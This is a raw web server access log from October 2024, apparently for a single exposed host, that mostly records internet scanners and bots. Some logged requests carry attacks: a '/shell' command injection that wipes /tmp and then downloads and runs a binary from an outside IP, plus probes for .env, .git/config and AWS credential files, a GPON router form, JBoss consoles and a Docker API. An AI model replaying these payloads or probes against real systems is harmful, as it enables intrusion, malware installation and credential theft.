217.148.140.139 - - [20/Oct/2024:00:03:08 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
61.223.225.143 - - [21/Oct/2024:02:29:39 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
135.125.217.54 - - [21/Oct/2024:03:01:59 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:03:01:59 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
111.224.192.173 - - [21/Oct/2024:03:09:54 +0000] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
71.6.232.27 - - [21/Oct/2024:03:17:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
129.232.209.234 - - [21/Oct/2024:03:20:09 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
201.217.220.26 - - [21/Oct/2024:03:20:09 +0000] "GET /nQm0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
147.185.133.15 - - [21/Oct/2024:03:29:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
91.90.42.154 - - [21/Oct/2024:03:37:21 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [21/Oct/2024:03:37:21 +0000] "GET /ECki HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; MALC)"
91.90.42.154 - - [21/Oct/2024:03:37:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; MALC)"
91.90.42.154 - - [21/Oct/2024:03:37:21 +0000] "GET /N5ue HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; MALC)"
125.230.141.20 - - [21/Oct/2024:04:25:58 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
66.79.96.227 - - [21/Oct/2024:04:28:17 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
64.62.156.88 - - [21/Oct/2024:04:31:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
64.62.156.88 - - [21/Oct/2024:04:33:50 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36"
64.62.156.91 - - [21/Oct/2024:04:34:22 +0000] "GET /geoserver/web/ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
122.116.3.138 - - [21/Oct/2024:04:35:16 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
135.125.217.54 - - [21/Oct/2024:04:38:37 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:04:38:37 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.206.142.254 - - [21/Oct/2024:04:40:03 +0000] "GET /druid/index.html HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
197.58.181.234 - - [21/Oct/2024:04:46:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 226 "-" "-"
111.224.192.173 - - [21/Oct/2024:04:47:14 +0000] "HEAD /match HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
185.224.128.47 - - [21/Oct/2024:05:19:19 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
5.8.11.202 - - [21/Oct/2024:05:28:07 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
198.98.54.234 - - [21/Oct/2024:05:35:42 +0000] "GET /command_port.ini HTTP/1.1" 302 - "-" "-"
135.125.217.54 - - [21/Oct/2024:05:39:26 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:05:39:26 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.126.163.216 - - [21/Oct/2024:05:43:21 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
220.132.148.108 - - [21/Oct/2024:05:43:37 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
220.135.152.21 - - [21/Oct/2024:05:49:45 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
114.36.51.183 - - [21/Oct/2024:06:02:01 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
106.1.106.35 - - [21/Oct/2024:06:21:22 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
35.187.27.99 - - [21/Oct/2024:06:29:29 +0000] "GET / HTTP/1.1" 200 1401 "-" "python-requests/2.32.3"
80.82.77.202 - - [21/Oct/2024:06:33:42 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36"
41.44.158.151 - - [21/Oct/2024:06:34:25 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 226 "-" "-"
136.144.17.30 - - [21/Oct/2024:06:36:43 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [21/Oct/2024:06:36:44 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
136.144.17.30 - - [21/Oct/2024:06:36:46 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [21/Oct/2024:06:36:48 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
66.240.219.146 - - [21/Oct/2024:06:41:44 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
66.240.219.146 - - [21/Oct/2024:06:41:44 +0000] "GET /robots.txt HTTP/1.1" 302 - "-" "-"
66.240.219.146 - - [21/Oct/2024:06:41:45 +0000] "GET /sitemap.xml HTTP/1.1" 302 - "-" "-"
66.240.219.146 - - [21/Oct/2024:06:41:45 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 - "-" "-"
66.240.219.146 - - [21/Oct/2024:06:41:45 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:06:53:51 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:06:53:52 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.233.194.64 - - [21/Oct/2024:07:03:26 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
4.233.194.64 - - [21/Oct/2024:07:03:26 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
178.215.238.85 - - [21/Oct/2024:07:12:12 +0000] "GET /login.rsp HTTP/1.1" 302 - "-" "Hello World"
90.54.179.158 - - [21/Oct/2024:07:19:45 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
114.34.222.184 - - [21/Oct/2024:07:30:03 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
149.102.251.11 - - [21/Oct/2024:07:32:07 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 Gecko/20100101 Firefox/91.0"
149.102.251.11 - - [21/Oct/2024:07:32:07 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0"
149.102.251.11 - - [21/Oct/2024:07:32:07 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:08 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0"
149.102.251.11 - - [21/Oct/2024:07:32:08 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:09 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:09 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:10 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:11 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:11 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:12 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:13 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
149.102.251.11 - - [21/Oct/2024:07:32:13 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
37.254.35.47 - - [21/Oct/2024:07:48:26 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
135.125.217.54 - - [21/Oct/2024:08:02:34 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:08:02:34 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.153.122.30 - - [21/Oct/2024:08:08:13 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
93.123.85.155 - - [21/Oct/2024:08:25:16 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:08:25:16 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.248.243.202 - - [21/Oct/2024:08:25:34 +0000] "GET /mTc8 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
195.26.253.72 - - [21/Oct/2024:08:28:08 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Go-http-client/1.1"
195.26.253.72 - - [21/Oct/2024:08:28:08 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/.git/config" "Go-http-client/1.1"
196.189.152.147 - - [21/Oct/2024:09:17:03 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 - "-" "Hello, World"
207.192.240.242 - - [21/Oct/2024:09:24:07 +0000] "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
207.192.240.242 - - [21/Oct/2024:09:24:27 +0000] "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
207.192.240.242 - - [21/Oct/2024:09:24:47 +0000] "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
207.192.240.242 - - [21/Oct/2024:09:25:07 +0000] "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
220.133.135.115 - - [21/Oct/2024:09:39:19 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
93.123.85.155 - - [21/Oct/2024:09:43:33 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:09:43:34 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.94.190.91 - - [21/Oct/2024:09:49:27 +0000] "\x16\x03\x01" 400 226 "-" "-"
34.94.190.91 - - [21/Oct/2024:09:49:29 +0000] "OPTIONS / HTTP/1.0" 200 1401 "-" "-"
135.125.217.54 - - [21/Oct/2024:09:53:10 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:09:53:10 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
123.240.127.181 - - [21/Oct/2024:09:59:07 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
218.161.28.27 - - [21/Oct/2024:10:02:18 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
220.133.40.168 - - [21/Oct/2024:10:13:04 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
91.90.42.154 - - [21/Oct/2024:10:19:11 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [21/Oct/2024:10:19:11 +0000] "GET /TMDw HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET4.0C)"
91.90.42.154 - - [21/Oct/2024:10:19:11 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET4.0C)"
91.90.42.154 - - [21/Oct/2024:10:19:12 +0000] "GET /Dwr0 HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET4.0C)"
91.90.42.154 - - [21/Oct/2024:10:32:23 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [21/Oct/2024:10:32:23 +0000] "GET /ENSv HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; LBBROWSER)"
91.90.42.154 - - [21/Oct/2024:10:32:24 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; LBBROWSER)"
91.90.42.154 - - [21/Oct/2024:10:32:24 +0000] "GET /QQpK HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; LBBROWSER)"
135.125.217.54 - - [21/Oct/2024:11:15:41 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [21/Oct/2024:11:15:41 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:11:32:03 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:11:32:03 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.148 - - [21/Oct/2024:11:35:09 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.148 - - [21/Oct/2024:11:35:10 +0000] "\x16\x03\x01" 400 226 "-" "-"
192.42.116.214 - - [21/Oct/2024:12:23:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/119.0.2151.97"
93.123.85.155 - - [21/Oct/2024:13:02:51 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [21/Oct/2024:13:02:51 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
217.148.140.139 - - [21/Oct/2024:13:07:24 +0000] "-" 408 - "-" "-"
185.206.227.180 - - [21/Oct/2024:13:28:00 +0000] "GET /Wem3 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
217.148.140.139 - - [21/Oct/2024:13:34:59 +0000] "GET randomURL HTTP/1.1" 400 226 "-" "-"
217.148.140.139 - - [21/Oct/2024:13:35:00 +0000] "GET beacon.http-get HTTP/1.1" 400 226 "-" "-"
185.224.128.47 - - [21/Oct/2024:13:39:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
13.58.97.162 - - [21/Oct/2024:13:49:22 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
80.75.212.9 - - [21/Oct/2024:13:51:53 +0000] "CONNECT worldsfastest.com:443 HTTP/1.1" 302 - "-" "Mozilla/5.0"
120.78.163.119 - - [21/Oct/2024:14:15:54 +0000] "GET /containers/json HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:54 +0000] "GET /version HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:55 +0000] "GET /config/aws.yml HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:55 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:55 +0000] "GET /aws.yml HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:56 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:56 +0000] "GET /.env.bak HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
120.78.163.119 - - [21/Oct/2024:14:15:57 +0000] "\x16\x03\x01" 400 226 "-" "-"
120.78.163.119 - - [21/Oct/2024:14:15:57 +0000] "\x16\x03\x01" 400 226 "-" "-"
120.78.163.119 - - [21/Oct/2024:14:15:59 +0000] "\x16\x03\x01" 400 226 "-" "-"
120.78.163.119 - - [21/Oct/2024:14:16:00 +0000] "\x16\x03\x01" 400 226 "-" "-"
120.78.163.119 - - [21/Oct/2024:14:16:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
120.78.163.119 - - [21/Oct/2024:14:16:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
193.177.162.138 - - [21/Oct/2024:14:36:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.177.162.138 - - [21/Oct/2024:14:36:39 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.177.162.138 - - [21/Oct/2024:14:36:39 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/.env" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.177.162.138 - - [21/Oct/2024:14:36:40 +0000] "GET /phpinfo HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.177.162.138 - - [21/Oct/2024:14:36:40 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/phpinfo" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.177.162.138 - - [21/Oct/2024:14:36:40 +0000] "GET /phpinfo.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
